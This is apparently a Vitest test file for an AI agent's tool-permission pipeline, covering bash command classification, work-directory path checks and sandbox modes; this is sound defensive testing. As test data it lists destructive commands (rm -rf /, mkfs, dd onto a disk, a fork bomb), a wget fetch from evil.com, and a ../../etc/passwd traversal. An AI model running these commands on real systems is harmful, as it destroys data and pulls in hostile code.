import { describe, expect, it } from "vitest";

import {
  classifyBashCommand,
  isDangerousCommand,
  isPathWithinWorkDir,
  validateToolPermission,
  type BashCommandClassification,
  type ToolPermissionResult,
} from "./permission-pipeline";

describe("permission pipeline", () => {
  describe("bash command classifier", () => {
    it("classifies read-only commands as trusted", () => {
      expect(classifyBashCommand("ls -la")).toMatchObject({ classification: "trusted", risk: "read" });
      expect(classifyBashCommand("cat file.txt")).toMatchObject({ classification: "trusted", risk: "read" });
      expect(classifyBashCommand("grep -r pattern .")).toMatchObject({ classification: "trusted", risk: "read" });
      expect(classifyBashCommand("find . -name '*.ts'")).toMatchObject({ classification: "trusted", risk: "read" });
      expect(classifyBashCommand("wc -l file.txt")).toMatchObject({ classification: "trusted", risk: "read" });
      expect(classifyBashCommand("head -20 file.txt")).toMatchObject({ classification: "trusted", risk: "read" });
      expect(classifyBashCommand("git status")).toMatchObject({ classification: "trusted", risk: "read" });
      expect(classifyBashCommand("git log --oneline -5")).toMatchObject({ classification: "trusted", risk: "read" });
      expect(classifyBashCommand("git diff")).toMatchObject({ classification: "trusted", risk: "read" });
    });

    it("classifies write commands as untrusted", () => {
      expect(classifyBashCommand("rm file.txt")).toMatchObject({ classification: "untrusted", risk: "write" });
      expect(classifyBashCommand("mv a.txt b.txt")).toMatchObject({ classification: "untrusted", risk: "write" });
      expect(classifyBashCommand("cp -r src dest")).toMatchObject({ classification: "untrusted", risk: "write" });
      expect(classifyBashCommand("mkdir -p new/dir")).toMatchObject({ classification: "untrusted", risk: "write" });
      expect(classifyBashCommand("git commit -m 'msg'")).toMatchObject({ classification: "untrusted", risk: "write" });
      expect(classifyBashCommand("git push")).toMatchObject({ classification: "untrusted", risk: "write" });
      expect(classifyBashCommand("npm install")).toMatchObject({ classification: "untrusted", risk: "write" });
    });

    it("classifies dangerous commands as dangerous", () => {
      expect(classifyBashCommand("rm -rf /")).toMatchObject({ classification: "dangerous", risk: "destructive" });
      expect(classifyBashCommand("mkfs.ext4 /dev/sda")).toMatchObject({ classification: "dangerous", risk: "destructive" });
      expect(classifyBashCommand("dd if=/dev/zero of=/dev/sda")).toMatchObject({ classification: "dangerous", risk: "destructive" });
      expect(classifyBashCommand(":(){ :|:& };:")).toMatchObject({ classification: "dangerous", risk: "destructive" });
      expect(classifyBashCommand("shutdown -h now")).toMatchObject({ classification: "dangerous", risk: "destructive" });
    });

    it("classifies network commands as untrusted", () => {
      expect(classifyBashCommand("curl https://example.com")).toMatchObject({ classification: "untrusted", risk: "network" });
      expect(classifyBashCommand("wget http://evil.com/payload")).toMatchObject({ classification: "untrusted", risk: "network" });
    });
  });

  describe("path validation", () => {
    it("allows paths within work directory", () => {
      expect(isPathWithinWorkDir("src/file.ts", "/project")).toBe(true);
      expect(isPathWithinWorkDir("./relative.txt", "/project")).toBe(true);
      expect(isPathWithinWorkDir("deep/nested/path.md", "/project")).toBe(true);
    });

    it("rejects paths escaping work directory", () => {
      expect(isPathWithinWorkDir("../escape.txt", "/project")).toBe(false);
      expect(isPathWithinWorkDir("../../etc/passwd", "/project")).toBe(false);
      expect(isPathWithinWorkDir("/absolute/path", "/project")).toBe(false);
    });
  });

  describe("tool permission validation", () => {
    it("allows read tools in any permission mode", () => {
      const result = validateToolPermission({ toolName: "Read", risk: "read", permissionMode: "read", workDir: "/project" });
      expect(result.allowed).toBe(true);
    });

    it("blocks write tools in read mode", () => {
      const result = validateToolPermission({ toolName: "Write", risk: "write", permissionMode: "read", workDir: "/project" });
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("read");
    });

    it("requires confirmation for write tools in ask mode", () => {
      const result = validateToolPermission({ toolName: "Write", risk: "write", permissionMode: "ask", workDir: "/project" });
      expect(result.allowed).toBe(false);
      expect(result.requiresConfirmation).toBe(true);
    });

    it("allows write tools in allow mode", () => {
      const result = validateToolPermission({ toolName: "Write", risk: "write", permissionMode: "allow", workDir: "/project" });
      expect(result.allowed).toBe(true);
    });

    it("always blocks dangerous commands regardless of mode", () => {
      const result = validateToolPermission({ toolName: "Bash", risk: "destructive", permissionMode: "allow", workDir: "/project", command: "rm -rf /" });
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("dangerous");
    });
  });

  describe("sandbox mode enforcement", () => {
    it("blocks write tools in read-only sandbox", () => {
      const result = validateToolPermission({ toolName: "Write", risk: "write", permissionMode: "allow", workDir: "/project", sandboxMode: "read-only" });
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("sandbox");
    });

    it("allows write tools in workspace-write sandbox within workDir", () => {
      const result = validateToolPermission({ toolName: "Write", risk: "write", permissionMode: "allow", workDir: "/project", sandboxMode: "workspace-write" });
      expect(result.allowed).toBe(true);
    });

    it("allows all operations in danger-full-access sandbox", () => {
      const result = validateToolPermission({ toolName: "Bash", risk: "write", permissionMode: "allow", workDir: "/project", sandboxMode: "danger-full-access", command: "rm important.txt" });
      expect(result.allowed).toBe(true);
    });
  });
});
